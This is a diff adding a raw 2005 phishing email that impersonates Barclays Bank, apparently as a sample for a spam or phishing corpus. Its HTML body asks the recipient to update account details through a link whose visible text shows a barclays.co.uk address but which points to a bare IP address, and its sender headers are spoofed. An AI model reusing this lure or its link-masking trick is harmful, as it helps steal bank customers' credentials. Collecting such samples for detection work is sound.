@@ -1,0 +1,232 @@
+Return-Path: <user@mail.example.com>
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.6.4])
+	by example.com (Postfix) with ESMTP id 7097A2A88C
+	for <user@example.com>; Sat, 15 Oct 2005 11:15:15 -0400 (EDT)
+Received: by mail.example.com (Example mail relay)
+	id 67443621C78; Sat, 15 Oct 2005 11:15:15 -0400 (EDT)
+Delivered-To: user@example.com
+Received: from mail.example.com (mail.example.com [192.168.3.6])
+	by mail.example.com (Example mail relay) with ESMTP id 45A0C621C66
+	for <user@example.com>; Sat, 15 Oct 2005 11:15:15 -0400 (EDT)
+Received: (from user@localhost)
+	by mail.example.com id LAA28666
+	for user@example.com; Sat, 15 Oct 2005 11:15:14 -0400
+Received: from ess5.esecuresite5.com (ev1s-66-98-188-70.ev1servers.net [66.98.188.70] (may be forged))
+	by mail.example.com with ESMTP id LAA28658
+	for <user@example.com>; Sat, 15 Oct 2005 11:15:14 -0400
+Received: from apache by ess5.esecuresite5.com with local (Exim 4.24)
+	id 1EQnjl-0008DL-IW
+	for user@example.com; Sat, 15 Oct 2005 16:14:17 +0100
+To: user@example.com
+Subject: Barclayes Bank - Update (Action required)
+From: Barclays Bank <notices@barclays.co.uk>
+Reply-To: notics@barclays.co.uk
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: 8bit
+Message-Id: <E1EQnjl-0008DL-IW@ess5.esecuresite5.com>
+Date: Sat, 15 Oct 2005 16:14:17 +0100
+Content-Length: 7076
+Lines: 195
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 203
+
+<html xmlns:v="urn:schemas-microsoft-com:vml"
+xmlns:o="urn:schemas-microsoft-com:office:office"
+xmlns:w="urn:schemas-microsoft-com:office:word"
+xmlns=" http://www.w3.org/TR/REC-html40">
+
+<head>
+<meta http-equiv=Content-Type content="text/html; charset=windows-1252">
+<meta name=ProgId content=Word.Document>
+<meta name=Generator content="Microsoft Word 11"> 
+<meta name=Originator content="Microsoft Word 11">
+<link rel=File-List href="barmail_files/filelist.xml">
+<link rel=Edit-Time-Data href="barmail_files/editdata.mso"> 
+<!--[if !mso]>
+<style>
+v\:* {behavior:url(#default#VML);}
+o\:* {behavior:url(#default#VML);}
+w\:* {behavior:url(#default#VML);}
+.shape {behavior:url(#default#VML);}
+</style>
+<![endif]--> 
+<title>New Page 1</title>
+<!--[if gte mso 9]><xml>
+ <o:DocumentProperties>
+  <o:Author>suky</o:Author>
+  <o:LastAuthor>suky</o:LastAuthor>
+  <o:Revision>3</o:Revision> 
+  <o:TotalTime>0</o:TotalTime>
+  <o:Created>2004-01-01T20:57:00Z</o:Created>
+  <o:LastSaved>2004-01-01T20:57:00Z</o:LastSaved>
+  <o:Pages>1</o:Pages>
+  <o:Words>187</o:Words> 
+  <o:Characters>1072</o:Characters>
+  <o:Lines>8</o:Lines>
+  <o:Paragraphs>2</o:Paragraphs>
+  <o:CharactersWithSpaces>1257</o:CharactersWithSpaces>
+  <o:Version> 11.5606</o:Version>
+ </o:DocumentProperties>
+</xml><![endif]--><!--[if gte mso 9]><xml>
+ <w:WordDocument>
+  <w:GrammarState>Clean</w:GrammarState>
+  <w:ValidateAgainstSchemas/> 
+  <w:SaveIfXMLInvalid>false</w:SaveIfXMLInvalid>
+  <w:IgnoreMixedContent>false</w:IgnoreMixedContent>
+  <w:AlwaysShowPlaceholderText>false</w:AlwaysShowPlaceholderText>
+  <w:BrowserLevel>MicrosoftInternetExplorer4</w:BrowserLevel> 
+ </w:WordDocument>
+</xml><![endif]--><!--[if gte mso 9]><xml>
+ <w:LatentStyles DefLockedState="false" LatentStyleCount="156">
+ </w:LatentStyles>
+</xml><![endif]-->
+<style>
+<!--
+ /* Style Definitions */
+ p.MsoNormal, li.MsoNormal, div.MsoNormal
+ {mso-style-parent:"";
+ margin:0cm;
+ margin-bottom:.0001pt;
+ mso-pagination:widow-orphan; 
+ font-size:12.0pt;
+ font-family:"Times New Roman";
+ mso-fareast-font-family:"Times New Roman";}
+p
+ {font-size:12.0pt;
+ font-family:"Times New Roman";
+ mso-fareast-font-family:"Times New Roman";} 
+span.GramE
+ {mso-style-name:"";
+ mso-gram-e:yes;}
+@page Section1
+ {size:612.0pt 792.0pt;
+ margin:72.0pt 90.0pt 72.0pt 90.0pt;
+ mso-header-margin:35.4pt;
+ mso-footer-margin:35.4pt;
+ mso-paper-source:0;} 
+div.Section1
+ {page:Section1;}
+-->
+</style>
+<!--[if gte mso 10]>
+<style>
+ /* Style Definitions */
+ table.MsoNormalTable
+ {mso-style-name:"Table Normal";
+ mso-tstyle-rowband-size:0; 
+ mso-tstyle-colband-size:0;
+ mso-style-noshow:yes;
+ mso-style-parent:"";
+ mso-padding-alt:0cm 5.4pt 0cm 5.4pt;
+ mso-para-margin:0cm;
+ mso-para-margin-bottom:.0001pt;
+ mso-pagination:widow-orphan; 
+ font-size:10.0pt;
+ font-family:"Times New Roman";
+ mso-ansi-language:#0400;
+ mso-fareast-language:#0400;
+ mso-bidi-language:#0400;}
+</style>
+<![endif]-->
+<meta http-equiv=Content-Language content=en-us> 
+</head>
+
+<body lang=EN-US link=blue vlink=blue style='tab-interval:36.0pt'>
+
+<div class=Section1>
+
+<table class=MsoNormalTable border=0 cellspacing=0 cellpadding=0 width="100%"
+ style='width:100.0%;border-collapse:collapse'>
+ <tr style='mso-yfti-irow:0;mso-yfti-firstrow:yes;height:56.25pt'> 
+  <td style='background:#003366;padding:.75pt .75pt .75pt .75pt;height:56.25pt'>
+  <table class=MsoNormalTable border=0 cellspacing=0 cellpadding=0 width="100%"
+   style='width:100.0%;border-collapse:collapse'> 
+   <tr style='mso-yfti-irow:0;mso-yfti-firstrow:yes;mso-yfti-lastrow:yes'>
+    <td width=222 style='width:166.5pt;padding:.75pt .75pt .75pt .75pt'>
+    <p class=MsoNormal align=right style='text-align:right'><img width=164 
+    height=28 id="_x0000_i1025"
+    src="http://www.barclays.co.uk/images_new/home/barclays_logo.gif"></p >
+    </td>
+    <td style='padding:.75pt .75pt .75pt .75pt'>
+    <p align=right style='text-align:right'><b><span style='font-size:10.0pt;
+    font-family:Arial;color:#00A8DC'>Important Notice: </span></b><b><span 
+    style='font-size:10.0pt;font-family:Arial;color:white'>Oct. 20, 2005</span></b><b><span
+    style='font-size:10.0pt;font-family:Arial;color:#00A8DC'>     
+    </span></b></p>
+    </td>
+   </tr>
+  </table>
+  <p class=MsoNormal> </p>
+  </td>
+ </tr>
+ <tr style='mso-yfti-irow:1;height: 15.75pt'>
+  <td style='padding:.75pt .75pt .75pt .75pt;height:15.75pt'>
+  <table class=MsoNormalTable border=0 cellspacing=0 cellpadding=0 width="62%"
+   style='width:62.0%;border-collapse:collapse' id=table3> 
+   <tr style='mso-yfti-irow:0;mso-yfti-firstrow:yes;mso-yfti-lastrow:yes'>
+    <td style='padding:.75pt .75pt .75pt .75pt'>
+    <p class=MsoNormal> </p>
+    </td>
+    <td width=563 style='width: 422.25pt;padding:.75pt .75pt .75pt .75pt'>
+    <p><span style='font-size:10.0pt;font-family:Arial;color:#003366'><br>
+    Dear Sir/Madam<span class=GramE>,</span><br>
+    <br> 
+    Barclays Bank PLC. <span class=GramE>always</span> looks forward for the
+    high security of our clients. Some customers have been receiving an email
+    claiming to be from Barclays advising them to follow a link to what appear 
+    to be a <span class=GramE>Barclays</span> web site, where they are prompted
+    to enter their personal Online Banking details. Barclays is in no way
+    involved with this email and the web site does not belong to us.</span></p> 
+    <p><span style='font-size:10.0pt;font-family:Arial;color:#003366'>Barclays
+    is proud to announce about their new updated secure system. We updated our
+    new SSL servers to give our customers a better, fast and secure online 
+    banking service.<br>
+    <br>
+    Due to the recent update of the servers, you are requested to please update
+    your account info at the following link.</span></p>
+    <p><b><span style='font-size: 10.0pt;font-family:Arial'><a
+    href="http://70.84.130.244/~midwest/Barclays/Barclays%20IBank.htm"><span 
+    style='color:#00A8DC'>http://www.barclays.co.uk/cgi-bin/accountupdate/1,00,102.html</span></a></span></b></p> 
+    <p><span style='font-size:10.0pt;font-family:Arial;color:#003366'><br>
+     </span></p>
+    <p><b><span style='font-size:10.0pt;font-family:Arial;color:#003366'>J. S. 
+    Smith</span></b><span style='font-size:10.0pt;font-family:Arial;color:#003366'><br>
+    <i>Security Advisor<br>
+    Barclays Bank PLC.</i></span><span style='font-size: 10.0pt;font-family:
+    Arial'><br>
+     </span></p>
+    </td>
+   </tr>
+  </table>
+  <div class=MsoNormal align=center style='text-align:center'>
+  <hr size=1 width="100%" align=center>
+  </div>
+  <p><span style='font-size:7.5pt;font-family:Arial;color:gray'>Please do not
+  reply to this e-mail. Mail sent to this address cannot be answered.<br> 
+  For assistance, log in to your Barclays Online Bank account and choose the
+  "Help" link on any page.<br>
+  <br>
+  Barclays Email ID # 1009</span></p>
+  </td> 
+ </tr>
+ <tr style='mso-yfti-irow:2;mso-yfti-lastrow:yes'>
+  <td style='padding:.75pt .75pt .75pt .75pt'>
+  <p class=MsoNormal> </p>
+  </td>
+ </tr>
+</table> 
+
+<p class=MsoNormal><o:p> </o:p></p>
+
+</div>
+
+</body>
+
+</html>
+
+
+
